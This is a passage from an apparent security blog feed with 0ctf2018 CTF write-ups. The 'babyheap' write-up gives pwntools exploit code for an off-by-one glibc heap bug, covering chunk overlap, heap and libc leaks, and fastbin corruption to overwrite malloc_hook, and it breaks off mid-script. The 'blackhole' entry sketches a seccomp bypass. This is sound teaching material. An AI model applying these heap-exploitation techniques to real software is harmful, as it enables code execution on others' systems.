src="http://onc55v8te.bkt.clouddn.com/2018-04-03-021500.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-022736.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-021612.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;small-bin大小&quot;&gt;&lt;a href=&quot;#small-bin大小&quot; class=&quot;headerlink&quot; title=&quot;small bin大小&quot;&gt;&lt;/a&gt;small bin大小&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http://onc55v8te.bkt.clo
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="堆利用" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    
      <category term="堆基础" scheme="http://eternalsakura13.com/tags/%E5%A0%86%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>0ctf2018 blackhole writeup</title>
    <link href="http://eternalsakura13.com/2018/04/03/blackhole/"/>
    <id>http://eternalsakura13.com/2018/04/03/blackhole/</id>
    <published>2018-04-02T20:55:09.212Z</published>
    <updated>2018-04-03T11:50:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/0ctf2018/blackhole.tar.gz" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/0ctf2018/blackhole.tar.gz</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这题和babystack是一样的，除了变成了64位，也是完全没有可以用来输出的函数。<br>而且，这题还设置了沙箱，限制了能够执行的系统调用为mprotect/read/write/exit。<br>所以说没办法getshell，只能一点一点的把flag给“注入”出来。</p><p>思路是先弄出一个syscall gadget,调一下mprotect，读进来shellcode就可以随便操作了。<br>sc逻辑的话，就把flag读进来，然后一个bit一个bit去爆破..<br>相当于sql盲注那样..可以构造个if flag[x]==’a’ sleep else exit..这样</p><p>另外，要想要调用系统调用，可以通过在got表地址里面写掉一个低Byte，从而可以可以跳转到附近的函数去，这里就是系统调用，如图。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-205935.jpg" alt=""></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>TODO<br>TODO<br>TODO<br>应该会写吧……嗯……</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;题目链接&quot;&gt;&lt;a href=&quot;#题目链接&quot; class=&quot;headerlink&quot; title=&quot;题目链接&quot;&gt;&lt;/a&gt;题目链接&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/eternalsakura/ctf_pwn/blob/master/
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="其他" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="ret2csu" scheme="http://eternalsakura13.com/tags/ret2csu/"/>
    
      <category term="seccomp" scheme="http://eternalsakura13.com/tags/seccomp/"/>
    
  </entry>
  
  <entry>
    <title>0ctf2018 babyheap writeup</title>
    <link href="http://eternalsakura13.com/2018/04/03/babyheap/"/>
    <id>http://eternalsakura13.com/2018/04/03/babyheap/</id>
    <published>2018-04-02T18:03:34.230Z</published>
    <updated>2018-04-03T11:49:39.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/0ctf2018/babyheap.tar.gz" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/0ctf2018/babyheap.tar.gz</a></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul><li>fastbin attack</li><li>off-by-one</li><li>overlap</li><li>熟悉malloc_state即main_arena,即知道main_arena是存储在libc.so的一个数据段。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    __libc_lock_define(, mutex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">    <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    mchunkptr top;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">    mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[ BINMAPSIZE ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Linked list, points to the next arena */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">       by free_list_lock in arena.c.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">       the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">       free_list_lock in arena.c.  */</span></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMBP:~$ checksec /Users/sakura/Desktop/0ctf/babyheap-1/babyheap</span><br><span class="line">[*] &apos;/Users/sakura/Desktop/0ctf/babyheap-1/babyheap&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>典型的菜单程序<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-181101.png" alt=""><br>比较特别的是存放堆指针的全局变量不再放在bss段，而是随机mmap了一段空间出来存放。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-181129.png" alt=""><br>添加<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-181505.png" alt=""><br>修改<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-181851.png" alt=""><br>删除<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-181957.png" alt=""><br>查看<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-182021.png" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在修改函数里存在一个off-by-one漏洞，可以用来溢出修改相邻chunk的prev_size或者size.<br>测试：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">alloc</span><span class="params">(size,nowait=False)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> nowait:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">res = p.recvuntil(<span class="string">'Allocated\n'</span>)</span><br><span class="line"><span class="keyword">return</span> int(res.split()[<span class="number">1</span>])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">update</span><span class="params">(idx,content,size=<span class="number">0</span>)</span>:</span></span><br><span class="line">size = size <span class="keyword">if</span> size <span class="keyword">else</span> len(content)</span><br><span class="line">content = content.ljust(size,<span class="string">"\x00"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">']: '</span>)</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(<span class="string">'1. Allocate'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./babyheap'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">a  = alloc(<span class="number">0x28</span>)</span><br><span class="line">b  = alloc(<span class="number">0x20</span>)</span><br><span class="line">update(a,<span class="string">'A'</span>*<span class="number">0x28</span> + chr(<span class="number">0x41</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">raw_input(<span class="string">'x'</span>)</span><br></pre></td></tr></table></figure></p><p>如图：<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-183058.png" alt=""><br>这里要注意一点就是我把分配的chunk修改一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a  = alloc(0x20)</span><br><span class="line">b  = alloc(0x20)</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-183230.png" alt=""><br>可以看出这样就修改到了下一个chunk的prev_size，之所以分配0x28和分配0x20都得到大小为0x30的chunk，是因为chunk的空间复用，如果当前chunk正在使用中，没有被free掉，那么相邻chunk的prev_size域是无效的，可以被前一个chunk使用。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="leak-heap"><a href="#leak-heap" class="headerlink" title="leak heap"></a>leak heap</h3><p>申请多个chunk，通过off-by-one改变其中一个chunk的size，使其包含两个chunk，即overlap。<br>然后在这个大chunk里伪造fastbin chunk B.<br>然后申请一个和其大小一致的fastbin chunk A，依次释放A和B。<br>则fastbin:B-&gt;A, B的fd就存放着A的堆地址，通过打印大chunk的内容，将其中存放着的小chunk打印出来，从而得到堆地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">meh  = alloc(<span class="number">0x10</span>) <span class="comment">#0</span></span><br><span class="line">ovf  = alloc(<span class="number">0x28</span>) <span class="comment">#1,为了能够溢出修改到相邻chunk的size</span></span><br><span class="line">vic  = alloc(<span class="number">0x20</span>) <span class="comment">#2</span></span><br><span class="line">fake = alloc(<span class="number">0x20</span>) <span class="comment">#3</span></span><br><span class="line">alloc(<span class="number">0x20</span>) <span class="comment">#4</span></span><br><span class="line">update(ovf,<span class="string">'a'</span>*<span class="number">0x28</span> + chr(<span class="number">0x51</span>)) <span class="comment">#2的size被修改为0x51,从而将3包括在内,overlapping！</span></span><br><span class="line">update(fake,p64(<span class="number">-1</span>,sign=<span class="string">'signed'</span>)+p64(<span class="number">-1</span>,sign=<span class="string">'signed'</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">delete(vic) <span class="comment">#2被free，且将3包含在内</span></span><br><span class="line">bigass = alloc(<span class="number">0x40</span>) <span class="comment">#将2再申请出来,此时的2为</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pwndbg&gt; x /20gx 0x555555757050</span></span><br><span class="line"><span class="string">index 2-&gt;0x555555757050:0x61616161616161610x0000000000000051-&gt;size</span></span><br><span class="line"><span class="string">         0x555555757060:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">         0x555555757070:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">index 3-&gt;0x555555757080:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">         0x555555757090:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">update(bigass,<span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))<span class="comment"># 在3伪造chunk，size为0x21</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">index 3-&gt;0x555555757080:0x00000000000000000x0000000000000021</span></span><br><span class="line"><span class="string">         0x555555757090:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">delete(meh) <span class="comment">#free 0</span></span><br><span class="line">delete(fake) <span class="comment">## free 3</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">fastbin:</span></span><br><span class="line"><span class="string">0x20:fake(3)-&gt;meh(0)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">heap = u64(view(bigass)[<span class="number">0x30</span>:][:<span class="number">8</span>])<span class="comment"># show 2，此时的chunk2,[0x30:][:8]即meh(0)的堆地址</span></span><br><span class="line">log.info(<span class="string">'[*]heap address:'</span>+hex(heap)) <span class="comment">#因为meh是第一个分配的chunk，所以它的地址就是heap基地址。</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">0</span></span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">1</span></span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">2</span></span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">3</span></span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">4</span></span><br><span class="line">update chunk:</span><br><span class="line"><span class="number">1</span></span><br><span class="line">update chunk:</span><br><span class="line"><span class="number">3</span></span><br><span class="line">delete chunk</span><br><span class="line"><span class="number">2</span></span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">2</span></span><br><span class="line">update chunk:</span><br><span class="line"><span class="number">2</span></span><br><span class="line">delete chunk</span><br><span class="line"><span class="number">0</span></span><br><span class="line">delete chunk</span><br><span class="line"><span class="number">3</span></span><br><span class="line">view chunk</span><br><span class="line"><span class="number">2</span></span><br><span class="line">[*] [*]heap address:<span class="number">0x5607a100f000</span></span><br></pre></td></tr></table></figure></p><h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><p>修改3的大小为超出fastbin范围的small bin的大小，将其free，则其fd和bk都指向main_arena，而main_arena在libc上，减去偏移就得到libc基地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">fake = alloc(<span class="number">0x10</span>)<span class="comment">#再将3申请出来，此时它的内容清空。</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">fastbin:</span></span><br><span class="line"><span class="string">0x20:meh(0)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">update(bigass,<span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>)+p64(<span class="number">0xd1</span>))  <span class="comment">#change fake size to 0xd1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pwndbg&gt; x /20gx 0x555555757050</span></span><br><span class="line"><span class="string">index 2:</span></span><br><span class="line"><span class="string">0x555555757050:0x61616161616161610x0000000000000051</span></span><br><span class="line"><span class="string">0x555555757060:0x61616161616161610x6161616161616161</span></span><br><span class="line"><span class="string">0x555555757070:0x61616161616161610x6161616161616161</span></span><br><span class="line"><span class="string">index 3:</span></span><br><span class="line"><span class="string">0x555555757080:0x00000000000000000x00000000000000d1-&gt;size</span></span><br><span class="line"><span class="string">0x555555757090:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">------------------------------------------------------------------</span></span><br><span class="line"><span class="string">0x5555557570a0:0x00000000000000000x0000000000000021</span></span><br><span class="line"><span class="string">0x5555557570b0:0x00000000000000000x0000000000000031</span></span><br><span class="line"><span class="string">0x5555557570c0:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x5555557570d0:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x5555557570e0:0x00000000000000000x0000000000020f21</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">alloc(<span class="number">88</span>,nowait=<span class="keyword">True</span>)</span><br><span class="line">xx = alloc(<span class="number">88</span>)</span><br><span class="line">update(xx,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pwndbg&gt; x /50gx 0x555555757080</span></span><br><span class="line"><span class="string">0x555555757080:0x00000000000000000x00000000000000d1-&gt;size</span></span><br><span class="line"><span class="string">0x555555757090:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x5555557570a0:0x00000000000000000x0000000000000021</span></span><br><span class="line"><span class="string">0x5555557570b0:0x00000000000000000x0000000000000031</span></span><br><span class="line"><span class="string">0x5555557570c0:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x5555557570d0:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x5555557570e0:0x00000000000000000x0000000000000061</span></span><br><span class="line"><span class="string">0x5555557570f0:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757100:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757110:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757120:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757130:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757140:0x00000000000000000x0000000000000061</span></span><br><span class="line"><span class="string">0x555555757150:0x00000000000000000x0000000000000021</span></span><br><span class="line"><span class="string">0x555555757160:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757170:0x00000000000000000x0000000000000021</span></span><br><span class="line"><span class="string">0x555555757180:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757190:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x5555557571a0:0x00000000000000000x0000000000020e61</span></span><br><span class="line"><span class="string">0x5555557571b0:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">'''</span>  </span><br><span class="line">delete(fake) <span class="comment"># 此时fake的大小属于small chunk,free后被添加到unsort bins, fd和bk指针指向libc上unsort bins的地址.</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(view(bigass)[<span class="number">0x30</span>:][:<span class="number">8</span>]) - <span class="number">88</span>     <span class="comment">#compute main_arena  header addr</span></span><br><span class="line">log.info(<span class="string">'[*]main_arena address:'</span>+hex(main_arena))</span><br><span class="line">libc = main_arena <span class="number">-0x399b00</span> <span class="comment">#需要用main_arena减去它在libc中的偏移才能得到libc基地址</span></span><br><span class="line"><span class="comment"># 这个偏移可以通过关闭aslr，cat /proc/pid/maps,查看libc的基地址，然后用leak出来main_arena减去这个基地址就得到了偏移。</span></span><br><span class="line">log.info(<span class="string">'[*]libc address:'</span>+hex(libc))</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">0</span></span><br><span class="line">update chunk:</span><br><span class="line"><span class="number">2</span></span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">5</span></span><br><span class="line">update chunk:</span><br><span class="line"><span class="number">5</span></span><br><span class="line">delete chunk</span><br><span class="line"><span class="number">0</span></span><br><span class="line">view chunk</span><br><span class="line"><span class="number">2</span></span><br><span class="line">[*] [*]main_arena address:<span class="number">0x7f1c45ddab00</span></span><br><span class="line">[*] [*]libc address:<span class="number">0x7f1c45a41000</span></span><br></pre></td></tr></table></figure></p><h3 id="修改top-chunk-覆盖malloc-hook为one-gadaget"><a href="#修改top-chunk-覆盖malloc-hook为one-gadaget" class="headerlink" title="修改top_chunk,覆盖malloc_hook为one_gadaget"></a>修改top_chunk,覆盖malloc_hook为one_gadaget</h3><p>通过改fastbin的fd，从而使得下一次分配的chunk到我们指定的地址（这里是top_chunk上方）。<br>然后修改top_chunk到malloc_hook上方，使得chunk的分配从malloc_chunk的上方附近开始进行。<br>于是下一次分配就分配到malloc_hook上方，从而可以覆盖malloc_hook为one_gadaget<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk2 = main_arena - <span class="number">0x33</span> <span class="comment">#在malloc_hook上方附近的地址</span></span><br><span class="line">fake_chunk  = main_arena + <span class="number">32</span> + <span class="number">5</span> <span class="comment">#用来绕过对fd的size大小的检查 </span></span><br><span class="line">fake = alloc(<span class="number">0x48</span>) <span class="comment">#将fake从unsorted bin申请出来</span></span><br><span class="line"></span><br><span class="line">xx = alloc(<span class="number">0x58</span>) <span class="comment">#free后，在fastbin占位，用来绕过对fd的size大小的检查 </span></span><br><span class="line"></span><br><span class="line">delete(xx) <span class="comment">#free后，在fastbin占位，用来绕过对fd的size大小的检查 </span></span><br><span class="line">delete(fake)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">fastbin:</span></span><br><span class="line"><span class="string">0x50: fake </span></span><br><span class="line"><span class="string">0x60: xx </span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">update(bigass,<span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+p64(fake_chunk)) <span class="comment"># 修改2,将3的fd指向main_arena + 32 + 5</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">fastbin:</span></span><br><span class="line"><span class="string">0x50: fake --&gt; main_arena + 32 + 5</span></span><br><span class="line"><span class="string">0x60: xx </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># print hex(fake_chunk),hex(fake_chunk2)</span></span><br><span class="line">alloc(<span class="number">0x48</span>) <span class="comment">#将fastbin中的fake再分配出来</span></span><br><span class="line">arena = alloc(<span class="number">0x48</span>)<span class="comment">#alloc main_arena + 32 + 5</span></span><br><span class="line"><span class="keyword">print</span> 